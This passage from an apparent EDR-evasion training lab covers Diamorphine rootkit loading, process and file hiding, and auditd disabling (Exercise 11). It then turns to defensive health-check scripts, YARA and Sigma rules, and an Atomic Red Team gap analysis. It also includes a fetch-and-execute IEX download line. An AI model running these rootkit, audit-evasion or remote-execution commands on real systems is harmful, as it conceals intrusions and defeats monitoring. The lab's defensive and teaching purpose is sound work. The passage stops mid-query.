# Falco should alert on:
# rule: ptrace on process owned by different user
# rule: /proc/<pid>/mem write by unexpected process
sudo journalctl -u falco --since "5 minutes ago" | grep -i "ptrace\|proc.*mem"
```

**YARA Rule**
```yara
rule Linux_Fileless_Exec_memfd {
    meta:
        description = "Linux fileless execution via memfd_create + fexecve"
        mitre = "T1620"
        severity = "critical"
        platform = "linux"
    strings:
        $memfd_str   = "memfd_create" ascii
        $fexecve_str = "fexecve" ascii
        $proc_fd     = "/proc/self/fd/" ascii
        $sys_memfd   = { 48 C7 C0 3F 01 00 00 }  /* mov rax, 319 (SYS_memfd_create) */
    condition:
        ($memfd_str and $fexecve_str) or
        ($sys_memfd and $proc_fd)
}
```

**Cleanup**
```bash
# linux-lab
kill $TARGET_PID 2>/dev/null
sudo sysctl kernel.yama.ptrace_scope=1
rm -f /tmp/memfd_exec /tmp/memfd_exec.c
rm -f /tmp/proc_inject /tmp/proc_mem_inject.c
# Reset auditd
sudo auditctl -D
sudo augenrules --load
```

---

### Exercise 11 — Linux Kernel Rootkit: Diamorphine + auditd Evasion

**Objective.** Load the Diamorphine LKM rootkit to hide a process and demonstrate auditd evasion via `auditctl -e 0` and immutable mode counter-attack.

**MITRE ATT&CK.** T1014 — Rootkit; T1562.012 — Impair Defenses: Disable or Modify Linux Audit System.

**Background.** Diamorphine is a loadable kernel module (LKM) rootkit that hooks `kill()` to intercept magic signals: signal 31 hides/unhides the sending process, signal 63 grants root to the sending process, signal 64 makes the module visible/invisible in `lsmod`. It also hooks `getdents64` to filter directory entries matching a magic prefix. Auditd evasion requires sending `auditctl -e 0` (disable auditing) or flooding the netlink socket to drop events.

---

**Step 1 — Build Diamorphine**

```bash
# linux-lab: kernel headers required
sudo apt-get install -y linux-headers-$(uname -r) build-essential

# Clone Diamorphine (educational reference — review source before building in any environment)
cd /tmp
git clone https://github.com/m0nad/Diamorphine.git
cd Diamorphine

# Review the source to understand hook locations
grep -n "hooked_kill\|hide_module\|MAGIC_PREFIX" diamorphine.c

# Build (requires CONFIG_MODULE_SIG=n or unsigned module loading)
make
ls -la diamorphine.ko
```

**Step 2 — Load and demonstrate**
```bash
# Load the module (requires root + modules_disabled=0)
sudo insmod diamorphine.ko
lsmod | grep diamorphine  # Should NOT appear after loading (hides itself)

# Start a target process to hide
sleep 999 &
HIDE_PID=$!
echo "[*] Sleep PID to hide: $HIDE_PID"

# Verify it is visible
ps aux | grep "sleep 999"

# Send signal 31 to hide the process
kill -31 $HIDE_PID
# Now the process is hidden from ps, top, /proc listing
ps aux | grep "sleep 999"  # should not appear
ls /proc/$HIDE_PID          # should fail

# Unhide: send signal 31 again
kill -31 $HIDE_PID
ps aux | grep "sleep 999"  # visible again

# Hide a directory entry (Diamorphine hides files/dirs starting with MAGIC_PREFIX)
# Default MAGIC_PREFIX is "diamorphine_secret"
mkdir /tmp/diamorphine_secret_test
ls /tmp/ | grep diamorphine  # should NOT appear
```

**Step 3 — auditd evasion**
```bash
# Method 1: disable auditing entirely
sudo auditctl -e 0
sudo auditctl -s | grep enabled  # should show: enabled 0

# Verify: generate events that should be logged but are not
sudo auditctl -a always,exit -F arch=b64 -S execve -k exec_test
ls /tmp  # generates execve — should NOT appear in log
sudo ausearch -k exec_test --start recent  # no events

# Method 2: lock audit configuration (immutable mode -e 2)
# CAUTION: -e 2 requires reboot to unlock — only do in disposable VM
# sudo auditctl -e 2
# After this, no process including root can change audit rules until reboot

# Method 3: flush all rules
sudo auditctl -D
sudo auditctl -l  # should show "No rules"

# Restore auditd functionality
sudo auditctl -e 1
sudo augenrules --load
```

**Step 4 — Rootkit detection**
```bash
# Check for hidden modules by comparing /proc/modules to lsmod
diff <(cut -d' ' -f1 /proc/modules | sort) <(lsmod | tail -n +2 | awk '{print $1}' | sort)

# Check syscall table for hooks (requires /proc/kallsyms access)
sudo cat /proc/kallsyms | grep "sys_kill\|sys_getdents"

# Volatility3 rootkit detection (on analysis-station)
# vol3 -f /dev/mem linux.check_syscall.Check_syscall
# vol3 -f /dev/mem linux.hidden_modules.Hidden_modules

# Falco rule for module loading
sudo journalctl -u falco --since "10 minutes ago" | grep -i "insmod\|init_module"
```

**YARA Rule**
```yara
rule Diamorphine_Rootkit_Source {
    meta:
        description = "Diamorphine LKM rootkit source or compiled module"
        mitre = "T1014"
        severity = "critical"
        platform = "linux"
    strings:
        $magic_prefix = "diamorphine_secret" ascii
        $signal31    = { 1F 00 00 00 }  /* signal 31 = 0x1F */
        $signal63    = { 3F 00 00 00 }  /* signal 63 = 0x3F */
        $hooked_kill = "hooked_kill" ascii
        $hide_mod    = "hide_module\x00" ascii
        $module_name = "diamorphine" ascii
    condition:
        ($magic_prefix and $hooked_kill) or
        ($module_name and $hide_mod)
}
```

**Cleanup**
```bash
# linux-lab: unload module
sudo rmmod diamorphine 2>/dev/null || echo "[*] Module already unloaded or hidden"
kill $HIDE_PID 2>/dev/null
rm -rf /tmp/Diamorphine /tmp/diamorphine_secret_test
sudo auditctl -e 1
sudo augenrules --load
```

---

## PART B — DEFENSIVE EXERCISES

---

### Exercise 12 — Windows EDR Sensor Verification and Telemetry Validation

**Objective.** Verify that all four EDR sensor layers are active and producing telemetry: kernel callbacks, ETW providers, user-mode hooks, and cloud/behavioral engine. Implement a PowerShell health monitor that checks each layer.

**MITRE ATT&CK (Detection).** DS0009 — Process; DS0011 — Module; DS0017 — Command; DS0023 — Named Pipe.

---

**EDR Health Check Script (`edr_health_check.ps1`)**
```powershell
<#
.SYNOPSIS
    Validates EDR sensor health across all four telemetry layers.
    Run as Administrator on windows-target.
.NOTES
    Author: lab-exercise  Date: 2026-05-18
#>

param(
    [string]$EDRService = "CsFalconService",  # CrowdStrike; change for other EDR
    [string]$EDRProcess = "CSFalconService",
    [switch]$Verbose
)

$results = [ordered]@{}
$pass = 0; $fail = 0

function Check-Result {
    param([string]$Name, [bool]$Status, [string]$Detail)
    $icon = if ($Status) { "[PASS]" } else { "[FAIL]" }
    Write-Host "$icon $Name" -ForegroundColor $(if ($Status) { "Green" } else { "Red" })
    if ($Detail -and ($Verbose -or !$Status)) { Write-Host "       $Detail" -ForegroundColor Gray }
    $script:results[$Name] = @{ Status = $Status; Detail = $Detail }
    if ($Status) { $script:pass++ } else { $script:fail++ }
}

Write-Host "`n=== EDR Health Check ===" -ForegroundColor Cyan
Write-Host "Timestamp: $(Get-Date -Format 'yyyy-MM-ddTHH:mm:ssZ' -AsUTC)" -ForegroundColor Gray
Write-Host ""

# ── Layer 1: Service and Process ──────────────────────────────────────────
Write-Host "[ Layer 1: Service / Process ]" -ForegroundColor Yellow

$svc = Get-Service -Name $EDRService -ErrorAction SilentlyContinue
Check-Result "EDR Service Running" ($svc -and $svc.Status -eq "Running") `
    "Service '$EDRService': $($svc?.Status)"

$proc = Get-Process -Name $EDRProcess -ErrorAction SilentlyContinue
Check-Result "EDR Process Alive" ($null -ne $proc) `
    "Process '$EDRProcess': $(if ($proc) { "PID=$($proc.Id)" } else { 'NOT FOUND' })"

# ── Layer 2: Kernel-Level Telemetry (ETW + Sysmon) ───────────────────────
Write-Host "`n[ Layer 2: Kernel Telemetry ]" -ForegroundColor Yellow

$sysmon = Get-Service -Name "Sysmon64" -ErrorAction SilentlyContinue
Check-Result "Sysmon64 Service Running" ($sysmon -and $sysmon.Status -eq "Running") `
    "Sysmon64: $($sysmon?.Status)"

# Verify Sysmon is producing events
$recentSysmon = Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" `
    -MaxEvents 1 -ErrorAction SilentlyContinue
$sysmonAge = if ($recentSysmon) {
    (Get-Date) - $recentSysmon.TimeCreated
} else { $null }
Check-Result "Sysmon Events Recent (<5 min)" `
    ($null -ne $sysmonAge -and $sysmonAge.TotalMinutes -lt 5) `
    "Last event: $(if ($recentSysmon) { $recentSysmon.TimeCreated.ToString('o') } else { 'NONE' })"

# Check ETW Threat Intelligence provider subscription
$etwTI = Get-WinEvent -ListProvider "Microsoft-Windows-Threat-Intelligence" -ErrorAction SilentlyContinue
Check-Result "ETW TI Provider Registered" ($null -ne $etwTI) `
    "GUID: f4e1897c-bb5d-5668-f1d8-040f4d8dd344"

# ── Layer 3: NTDLL Hook Integrity ─────────────────────────────────────────
Write-Host "`n[ Layer 3: User-Mode Hook Integrity ]" -ForegroundColor Yellow

$checkHooks = {
    $ntdll = [System.Reflection.Assembly]::LoadFrom("C:\Windows\System32\ntdll.dll") 2>$null
    $ntdllBase = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE(
        [System.Reflection.Assembly]::GetExecutingAssembly().GetModules()[0]
    )
    # Use kernel32 to get ntdll base and check NtAllocateVirtualMemory
    Add-Type -TypeDefinition @"
using System; using System.Runtime.InteropServices;
public class NtCheck {
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
    public static extern IntPtr GetModuleHandleA(string name);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr h, string name);
}
"@
    $ntdllH = [NtCheck]::GetModuleHandleA("ntdll.dll")
    $fn = [NtCheck]::GetProcAddress($ntdllH, "NtAllocateVirtualMemory")
    if ($fn -eq [IntPtr]::Zero) { return $false }
    $bytes = New-Object byte[] 4
    [System.Runtime.InteropServices.Marshal]::Copy($fn, $bytes, 0, 4)
    # Hooked: first byte is E9 (JMP rel32) or FF 25 (JMP [rip+n])
    $isHooked = ($bytes[0] -eq 0xE9 -or ($bytes[0] -eq 0xFF -and $bytes[1] -eq 0x25))
    return $isHooked
}

$hookPresent = & $checkHooks
Check-Result "NtAllocVM Hook Present (EDR active)" $hookPresent `
    "$(if ($hookPresent) { 'JMP detected at NtAllocateVirtualMemory prologue' } else { 'WARNING: no hook — EDR may be bypassed or not installed' })"

# ── Layer 4: Tamper Protection and RT Protection ──────────────────────────
Write-Host "`n[ Layer 4: Security Config ]" -ForegroundColor Yellow

# Windows Defender Tamper Protection
try {
    $mpPref = Get-MpPreference -ErrorAction Stop
    Check-Result "Defender RT Protection Enabled" ($mpPref.DisableRealtimeMonitoring -eq $false) `
        "DisableRealtimeMonitoring=$($mpPref.DisableRealtimeMonitoring)"
} catch {
    Check-Result "Defender RT Protection Enabled" $false "Could not query MpPreference: $_"
}

# Tamper Protection via registry
$tamperReg = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" `
    -Name "TamperProtection" -ErrorAction SilentlyContinue
Check-Result "Tamper Protection Enabled" ($tamperReg -and $tamperReg.TamperProtection -ge 4) `
    "TamperProtection value: $($tamperReg?.TamperProtection)"

# Signature recency
try {
    $mpStatus = Get-MpComputerStatus -ErrorAction Stop
    $sigAge = (Get-Date) - $mpStatus.AntivirusSignatureLastUpdated
    Check-Result "Signatures Recent (<24h)" ($sigAge.TotalHours -lt 24) `
        "Last updated: $($mpStatus.AntivirusSignatureLastUpdated.ToString('o'))"
} catch {
    Check-Result "Signatures Recent (<24h)" $false "Could not query MpComputerStatus: $_"
}

# NTDLL integrity: compare .text section hash against KnownDlls
# (simplified — full implementation would use a kernel-mode comparison)
$ntdllPath = "C:\Windows\System32\ntdll.dll"
$ntdllHash = (Get-FileHash $ntdllPath -Algorithm SHA256).Hash
Check-Result "NTDLL On-Disk Hash Accessible" ($null -ne $ntdllHash) `
    "SHA256: $ntdllHash"

# ── Summary ───────────────────────────────────────────────────────────────
Write-Host "`n=== Summary ===" -ForegroundColor Cyan
Write-Host "PASS: $pass  FAIL: $fail" -ForegroundColor $(if ($fail -eq 0) { "Green" } else { "Red" })

# Export JSON report
$report = @{
    timestamp = (Get-Date -Format 'o')
    hostname  = $env:COMPUTERNAME
    checks    = $results
    summary   = @{ pass = $pass; fail = $fail }
}
$reportPath = "C:\lab\edr_health_$(Get-Date -Format 'yyyyMMddHHmmss').json"
$report | ConvertTo-Json -Depth 5 | Set-Content -Path $reportPath
Write-Host "`nReport written to: $reportPath" -ForegroundColor Gray
```

```powershell
# Run
New-Item -ItemType Directory -Path C:\lab -Force | Out-Null
powershell.exe -ExecutionPolicy Bypass -File C:\lab\edr_health_check.ps1 -Verbose
```

**Expected output (healthy system)**
```
=== EDR Health Check ===
Timestamp: 2026-05-18T10:00:00Z

[ Layer 1: Service / Process ]
[PASS] EDR Service Running
[PASS] EDR Process Alive

[ Layer 2: Kernel Telemetry ]
[PASS] Sysmon64 Service Running
[PASS] Sysmon Events Recent (<5 min)
[PASS] ETW TI Provider Registered

[ Layer 3: User-Mode Hook Integrity ]
[PASS] NtAllocVM Hook Present (EDR active)

[ Layer 4: Security Config ]
[PASS] Defender RT Protection Enabled
[PASS] Tamper Protection Enabled
[PASS] Signatures Recent (<24h)
[PASS] NTDLL On-Disk Hash Accessible

=== Summary ===
PASS: 10  FAIL: 0
```

---

### Exercise 13 — macOS EDR and TCC Monitoring

**Objective.** Implement a bash health check for macOS EDR components, monitor TCC.db for unauthorized modifications, and verify ESF consumer registration.

**macOS EDR health check (`macos_edr_health.sh`)**
```bash
#!/usr/bin/env bash
# macos_edr_health.sh — macOS EDR health verification
# Run as root on macos-lab
set -euo pipefail

PASS=0; FAIL=0
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

check() {
    local name="$1" status="$2" detail="${3:-}"
    if [[ "$status" == "pass" ]]; then
        printf "\033[32m[PASS]\033[0m %s\n" "$name"
        ((PASS++))
    else
        printf "\033[31m[FAIL]\033[0m %s\n" "$name"
        [[ -n "$detail" ]] && printf "       %s\n" "$detail"
        ((FAIL++))
    fi
}

echo "=== macOS EDR Health Check ==="
echo "Timestamp: $TIMESTAMP"
echo ""

# ── CrowdStrike Falcon checks (adapt for Jamf Protect / other EDR) ──────
echo "[ Layer 1: EDR Agent ]"

if launchctl list | grep -q "com.crowdstrike.falcon"; then
    check "CrowdStrike Falcon LaunchDaemon" pass
else
    check "CrowdStrike Falcon LaunchDaemon" fail "Not found in launchctl list"
fi

if pgrep -x "falconctl" > /dev/null 2>&1 || pgrep -x "falcon" > /dev/null 2>&1; then
    check "Falcon process running" pass
else
    check "Falcon process running" fail "No falcon process found"
fi

# ── System Integrity Protection ─────────────────────────────────────────
echo ""
echo "[ Layer 2: System Security ]"

sip_status=$(csrutil status 2>/dev/null)
if echo "$sip_status" | grep -q "enabled"; then
    check "SIP enabled" pass "$sip_status"
else
    check "SIP enabled" fail "$sip_status"
fi

# AMFI status
amfi_status=$(nvram boot-args 2>/dev/null | grep -o "amfi_get_out_of_my_way=1" || echo "")
if [[ -z "$amfi_status" ]]; then
    check "AMFI not disabled in boot-args" pass
else
    check "AMFI not disabled in boot-args" fail "amfi_get_out_of_my_way=1 found in boot-args"
fi

# Gatekeeper
gk=$(spctl --status 2>/dev/null)
if echo "$gk" | grep -q "assessments enabled"; then
    check "Gatekeeper enabled" pass
else
    check "Gatekeeper enabled" fail "$gk"
fi

# ── TCC Database Integrity ───────────────────────────────────────────────
echo ""
echo "[ Layer 3: TCC Integrity ]"

TCC_DB="/Library/Application Support/com.apple.TCC/TCC.db"
if [[ -f "$TCC_DB" ]]; then
    # Check for suspicious non-Apple entries with broad access grants
    suspicious=$(sqlite3 "$TCC_DB" \
        "SELECT service, client, auth_value FROM access
         WHERE client NOT LIKE 'com.apple.%'
           AND auth_value = 2
           AND service IN ('kTCCServiceAccessibility','kTCCServiceSystemPolicyAllFiles');" 2>/dev/null)
    if [[ -z "$suspicious" ]]; then
        check "No suspicious TCC broad grants (non-Apple)" pass
    else
        check "No suspicious TCC broad grants (non-Apple)" fail \
            "Suspicious entries: $suspicious"
    fi

    # Track TCC.db modification time
    tcc_mtime=$(stat -f "%Sm" -t "%Y-%m-%dT%H:%M:%S" "$TCC_DB" 2>/dev/null)
    echo "       TCC.db last modified: $tcc_mtime"
    check "TCC.db accessible for monitoring" pass "Path: $TCC_DB"
else
    check "TCC.db accessible for monitoring" fail "$TCC_DB not found"
fi

# ── XProtect and MRT ─────────────────────────────────────────────────────
echo ""
echo "[ Layer 4: Built-in Protections ]"

xprotect_ver=$(defaults read /System/Library/CoreServices/XProtect.bundle/Contents/version.plist \
    CFBundleShortVersionString 2>/dev/null || echo "unknown")
check "XProtect version readable" "$([ "$xprotect_ver" != "unknown" ] && echo pass || echo fail)" \
    "Version: $xprotect_ver"

# Check MRT last run
if launchctl list | grep -q "com.apple.MRT"; then
    check "MRT LaunchDaemon active" pass
else
    check "MRT LaunchDaemon active" fail
fi

# ── ESF Consumer Registration ────────────────────────────────────────────
echo ""
echo "[ Layer 5: ESF Consumers ]"

# Check for registered ESF consumers (requires entitlement com.apple.developer.endpoint-security.client)
if es_validate 2>/dev/null; then
    check "ESF framework available" pass
else
    # es_validate is not a standard tool; check for known EDR ESF usage
    if find /Library/SystemExtensions /Applications -name "*.appex" \
        -exec codesign -dv {} \; 2>&1 | grep -q "endpoint-security" 2>/dev/null; then
        check "ESF consumer extension found" pass
    else
        check "ESF consumer extension found" fail "No ESF extensions detected"
    fi
fi

# ── Summary ──────────────────────────────────────────────────────────────
echo ""
echo "=== Summary ==="
printf "PASS: \033[32m%d\033[0m  FAIL: \033[31m%d\033[0m\n" "$PASS" "$FAIL"

# JSON report
REPORT="/tmp/macos_edr_health_$(date -u +%Y%m%d%H%M%S).json"
python3 -c "
import json, sys
data = {
    'timestamp': '$TIMESTAMP',
    'hostname': '$(hostname)',
    'pass': $PASS,
    'fail': $FAIL,
    'tcc_db_mtime': '${tcc_mtime:-unknown}',
    'xprotect_version': '$xprotect_ver'
}
print(json.dumps(data, indent=2))
" > "$REPORT"
echo "Report: $REPORT"
```

```bash
# Run on macos-lab
sudo chmod +x /tmp/macos_edr_health.sh
sudo /tmp/macos_edr_health.sh
```

---

### Exercise 14 — Linux EDR and auditd Health Check

**Objective.** Verify Falco, auditd, BPF LSM, and kernel module signing are correctly configured. Detect any tampering with the audit rule set.

**Linux EDR health check (`linux_edr_health.sh`)**
```bash
#!/usr/bin/env bash
# linux_edr_health.sh — Linux EDR/detection infrastructure health check
# Run as root on linux-lab
set -euo pipefail

PASS=0; FAIL=0
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

check() {
    local name="$1" status="$2" detail="${3:-}"
    if [[ "$status" == "pass" ]]; then
        printf "\033[32m[PASS]\033[0m %s\n" "$name"
        ((PASS++)) || true
    else
        printf "\033[31m[FAIL]\033[0m %s\n" "$name"
        [[ -n "$detail" ]] && printf "       %s\n" "$detail"
        ((FAIL++)) || true
    fi
}

echo "=== Linux EDR/Detection Health Check ==="
echo "Timestamp: $TIMESTAMP  Kernel: $(uname -r)"
echo ""

# ── Falco ────────────────────────────────────────────────────────────────
echo "[ Falco ]"
if systemctl is-active --quiet falco; then
    check "Falco service running" pass
else
    check "Falco service running" fail "systemctl status falco"
fi

# Check Falco is actually producing events (last event in journal)
falco_last=$(journalctl -u falco --since "5 minutes ago" --no-pager -q 2>/dev/null | tail -1)
if [[ -n "$falco_last" ]]; then
    check "Falco events in last 5 min" pass "Last: ${falco_last:0:100}"
else
    check "Falco events in last 5 min" fail "No recent Falco events (may be quiet lab)"
fi

# Falco rules loaded
falco_rules=$(falco --list 2>/dev/null | wc -l || echo 0)
check "Falco rules loaded (>10)" "$( [ "$falco_rules" -gt 10 ] && echo pass || echo fail)" \
    "Rules count: $falco_rules"

# ── auditd ────────────────────────────────────────────────────────────────
echo ""
echo "[ auditd ]"

if systemctl is-active --quiet auditd; then
    check "auditd service running" pass
else
    check "auditd service running" fail
fi

audit_enabled=$(auditctl -s 2>/dev/null | grep "^enabled" | awk '{print $2}' || echo 0)
check "auditd enabled (not disabled)" "$( [ "$audit_enabled" -ne 0 ] && echo pass || echo fail)" \
    "enabled=$audit_enabled (0=off, 1=on, 2=immutable)"

# Check for critical rules
for key in exec_monitor ptrace_monitor kmod_monitor fileless_exec; do
    if auditctl -l 2>/dev/null | grep -q "$key"; then
        check "audit rule: $key" pass
    else
        check "audit rule: $key" fail "Missing rule with key=$key"
    fi
done

# Detect if audit rules were modified/flushed
audit_rules_count=$(auditctl -l 2>/dev/null | grep -c "^-a\|-A\|-w" || echo 0)
check "Audit rules count (>3)" "$( [ "$audit_rules_count" -gt 3 ] && echo pass || echo fail)" \
    "Rules: $audit_rules_count"

# ── Kernel Security ──────────────────────────────────────────────────────
echo ""
echo "[ Kernel Security ]"

# Module signing
modules_sig=$(cat /proc/sys/kernel/modules_disabled 2>/dev/null || echo "unavailable")
check "Kernel modules_disabled readable" "$( [ "$modules_sig" != "unavailable" ] && echo pass || echo fail)" \
    "modules_disabled=$modules_sig"

# Check for BPF LSM
bpf_lsm=$(cat /sys/kernel/security/lsm 2>/dev/null || echo "")
if echo "$bpf_lsm" | grep -q "bpf"; then
    check "BPF LSM enabled" pass "LSM list: $bpf_lsm"
else
    check "BPF LSM enabled" fail "BPF not in LSM list: $bpf_lsm"
fi

# Kernel lockdown
lockdown=$(cat /sys/kernel/security/lockdown 2>/dev/null || echo "not available")
check "Kernel lockdown readable" "$( [ "$lockdown" != "not available" ] && echo pass || echo fail)" \
    "Lockdown: $lockdown"

# Check for hidden kernel modules (compare /proc/modules to /sys/module)
proc_mods=$(cut -d' ' -f1 /proc/modules | sort)
sys_mods=$(ls /sys/module/ | sort)
hidden=$(comm -23 <(echo "$sys_mods") <(echo "$proc_mods") | head -5)
if [[ -z "$hidden" ]]; then
    check "No hidden kernel modules detected" pass
else
    check "No hidden kernel modules detected" fail "Possibly hidden: $hidden"
fi

# Active BPF programs (rootkit indicator if unexpected count)
bpf_count=$(bpftool prog list 2>/dev/null | grep -c "^[0-9]" || echo 0)
check "BPF program count logged" pass "Active BPF progs: $bpf_count"

# ── Summary ──────────────────────────────────────────────────────────────
echo ""
echo "=== Summary ==="
printf "PASS: \033[32m%d\033[0m  FAIL: \033[31m%d\033[0m\n" "$PASS" "$FAIL"

cat > "/tmp/linux_edr_health_$(date -u +%Y%m%d%H%M%S).json" << JSON
{
  "timestamp": "$TIMESTAMP",
  "hostname": "$(hostname)",
  "kernel": "$(uname -r)",
  "pass": $PASS,
  "fail": $FAIL,
  "audit_enabled": $audit_enabled,
  "audit_rules_count": $audit_rules_count,
  "bpf_prog_count": $bpf_count
}
JSON
echo "Report written to /tmp/linux_edr_health_*.json"
```

```bash
sudo chmod +x /tmp/linux_edr_health.sh
sudo /tmp/linux_edr_health.sh
```

---

### Exercise 15 — YARA and Sigma Rule Deployment

**Objective.** Deploy a curated YARA ruleset to scan running processes and memory regions for evasion IOCs identified in Part A, and load corresponding Sigma rules into the SIEM (Elasticsearch/Kibana on windows-edr).

**Step 1 — Compile YARA ruleset**
```bash
# analysis-station: compile all YARA rules from the exercises into one ruleset
mkdir -p /opt/lab/yara_rules

cat > /opt/lab/yara_rules/edr_evasion.yar << 'EOF'
/* Combined YARA ruleset — EDR evasion IOCs */

rule NTDLL_KnownDlls_Unhook_Code {
    meta:
        description = "NTDLL KnownDlls unhooking sequence"
        mitre = "T1562.001"
        severity = "critical"
    strings:
        $knowndlls_path = { 5C 00 4B 00 6E 00 6F 00 77 00 6E 00 44 00 6C 00 6C 00 73 00 }
        $ntopenSection  = "NtOpenSection" ascii
        $ntMapView      = "NtMapViewOfSection" ascii
    condition:
        uint16(0) == 0x5A4D and $knowndlls_path and
        ($ntopenSection or $ntMapView)
}

rule Direct_Syscall_Stub_Pattern {
    meta:
        description = "Hand-crafted syscall stubs (Hell's Gate / Halo's Gate)"
        mitre = "T1106"
        severity = "high"
    strings:
        $stub = { 4C 8B D1 B8 ?? ?? 00 00 0F 05 C3 }
    condition:
        uint16(0) == 0x5A4D and #stub >= 3
}

rule ETW_EtwEventWrite_Patch {
    meta:
        description = "EtwEventWrite patch (xor eax,eax; ret)"
        mitre = "T1562.006"
        severity = "critical"
    strings:
        $etw_fn_name = "EtwEventWrite" ascii
        $xor_eax_ret = { 33 C0 C3 }
        $ntdll_str   = "ntdll.dll" ascii nocase
    condition:
        uint16(0) == 0x5A4D and $etw_fn_name and $xor_eax_ret and $ntdll_str
}

rule AMSI_Bypass_Patch_Bytes {
    meta:
        description = "AMSI AmsiScanBuffer patch or reflection bypass"
        mitre = "T1562.001"
        severity = "critical"
    strings:
        $patch_einval   = { B8 57 00 07 80 C3 }
        $amsi_init_fail = "amsiInitFailed" ascii wide nocase
        $amsi_dll       = "amsi.dll" ascii nocase
    condition:
        uint16(0) == 0x5A4D and
        (($amsi_dll and $patch_einval) or $amsi_init_fail)
}

rule Early_Bird_APC_Injection {
    meta:
        description = "Early Bird APC injection pattern"
        mitre = "T1055.004"
        severity = "critical"
    strings:
        $ntqueueapc   = "NtQueueApcThread" ascii
        $virtualalloc = "VirtualAllocEx" ascii
        $writeprocmem = "WriteProcessMemory" ascii
    condition:
        uint16(0) == 0x5A4D and
        $ntqueueapc and $virtualalloc and $writeprocmem
}

rule Linux_Fileless_Exec_memfd {
    meta:
        description = "Linux fileless execution via memfd_create + fexecve"
        mitre = "T1620"
        severity = "critical"
        platform = "linux"
    strings:
        $memfd_str   = "memfd_create" ascii
        $fexecve_str = "fexecve" ascii
        $proc_fd     = "/proc/self/fd/" ascii
    condition:
        $memfd_str and $fexecve_str
}

rule Diamorphine_Rootkit_Indicators {
    meta:
        description = "Diamorphine LKM rootkit indicators"
        mitre = "T1014"
        severity = "critical"
        platform = "linux"
    strings:
        $magic_prefix = "diamorphine_secret" ascii
        $hooked_kill  = "hooked_kill" ascii
        $hide_mod     = "hide_module" ascii
        $module_name  = "diamorphine" ascii
    condition:
        ($magic_prefix and $hooked_kill) or ($module_name and $hide_mod)
}
EOF

# Compile to check syntax
yara /opt/lab/yara_rules/edr_evasion.yar /opt/lab/yara_rules/edr_evasion.yar
echo "[+] YARA ruleset compiles cleanly"
```

**Step 2 — Scan running processes (Linux)**
```bash
# analysis-station: scan /proc/<pid>/exe for all running processes
echo "[*] Scanning running process executables with YARA..."
for pid in /proc/[0-9]*/exe; do
    target=$(readlink "$pid" 2>/dev/null) || continue
    [[ -f "$target" ]] || continue
    result=$(yara -s /opt/lab/yara_rules/edr_evasion.yar "$target" 2>/dev/null)
    [[ -n "$result" ]] && echo "[MATCH] $result"
done
echo "[*] Process scan complete"

# Scan /dev/shm and /tmp for fileless artifacts
yara -r /opt/lab/yara_rules/edr_evasion.yar /dev/shm /tmp 2>/dev/null
```

**Step 3 — Load Sigma rules into Elasticsearch (windows-edr)**
```powershell
# windows-edr: install sigma-cli and convert rules to ES queries
pip install sigma-cli
sigma install packs sigma-base

# Convert our lab Sigma rules to Elasticsearch DSL
$sigmaRules = @"
title: NTDLL .text Section Protection Changed to Writable
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
logsource:
    product: windows
    category: api_call
detection:
    selection:
        EventType: NtProtectVirtualMemory
        TargetModule|contains: 'ntdll.dll'
        NewProtection|contains: 'WRITE'
    condition: selection
level: critical
"@

$sigmaRules | Set-Content -Path C:\lab\sigma_ntdll.yml -Encoding UTF8

# Convert to Elasticsearch Query DSL
sigma convert -t lucene -p windows-logsources C:\lab\sigma_ntdll.yml

# Import into Kibana via API
$kibanaUrl = "http://192.168.57.20:5601"
$headers = @{"kbn-xsrf"="true"; "Content-Type"="application/json"}
# Load rule via Kibana Detection Engine API
# (see Kibana API docs for exact payload structure)
Invoke-RestMethod -Uri "$kibanaUrl/api/detection_engine/rules" `
    -Method POST -Headers $headers `
    -Body (Get-Content C:\lab\sigma_ntdll_es.json -Raw) -ErrorAction SilentlyContinue
```

**Cleanup**
```bash
# analysis-station
rm -rf /opt/lab/yara_rules
```
```powershell
# windows-edr
Remove-Item C:\lab\sigma_*.yml -ErrorAction SilentlyContinue
```

---

### Exercise 16 — Atomic Red Team Validation and EDR Gap Analysis

**Objective.** Execute Atomic Red Team tests mapped to each evasion technique from Part A, collect telemetry, and produce a gap analysis report showing which TTPs generate alerts and which are blind spots.

**Step 1 — Install Invoke-AtomicRedTeam**
```powershell
# windows-target (Run as Administrator)
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force
Install-Module -Name invoke-atomicredteam -Force
Install-Module -Name powershell-yaml -Force

# Download atomics
IEX (New-Object Net.WebClient).DownloadString(
    'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1'
)
Install-AtomicRedTeam -getAtomics
```

**Step 2 — Run targeted atomic tests**
```powershell
# Map our exercises to ART test IDs
$atomicTests = @(
    @{ TID = "T1562.001"; Name = "Impair EDR - AMSI/ETW bypass" },
    @{ TID = "T1055.004"; Name = "APC Injection - Early Bird" },
    @{ TID = "T1134.004"; Name = "PPID Spoofing" },
    @{ TID = "T1106";     Name = "Native API Direct Syscall" },
    @{ TID = "T1059.001"; Name = "PowerShell AMSI bypass" },
    @{ TID = "T1620";     Name = "Reflective Code Loading" }
)

$results = @()
foreach ($test in $atomicTests) {
    Write-Host "`n[*] Executing: $($test.TID) - $($test.Name)" -ForegroundColor Cyan
    $before = (Get-Date)
    try {
        Invoke-AtomicTest $test.TID -TimeoutSeconds 30 -ErrorAction Stop
        $status = "EXECUTED"
    } catch {
        $status = "ERROR: $_"
    }
    $after = (Get-Date)
    $results += [PSCustomObject]@{
        TID      = $test.TID
        Name     = $test.Name
        Status   = $status
        Duration = ($after - $before).TotalSeconds
        Time     = $before.ToString('o')
    }
    Start-Sleep -Seconds 5  # allow telemetry to flush
}

# Export results
$results | ConvertTo-Json | Set-Content -Path C:\lab\art_results.json
$results | Format-Table -AutoSize
```

**Step 3 — Query SIEM for detections**
```powershell
# windows-edr: query Elasticsearch for alerts generated during the test window
$esUrl = "http://192.168.57.20:9200"
$startTime = (Get-Date).AddMinutes(-30).ToString('o')

$query = @{
    query = @{
        bool = @{
            must = @(
